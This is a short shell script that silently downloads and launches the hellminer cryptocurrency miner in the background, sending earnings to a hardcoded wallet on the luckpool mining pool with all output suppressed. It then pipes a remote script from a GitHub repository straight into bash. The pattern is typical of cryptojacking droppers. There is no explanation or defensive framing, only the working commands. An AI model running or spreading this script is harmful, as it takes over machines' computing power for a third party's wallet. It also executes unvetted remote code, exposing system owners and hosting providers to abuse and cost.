#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz >/dev/null 2>&1
tar -xvf hellminer_linux64.tar.gz
./hellminer -c stratum+tcp://eu.luckpool.net:3956 -u RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F."A$RANDOM" >/dev/null 2>&1 &
curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
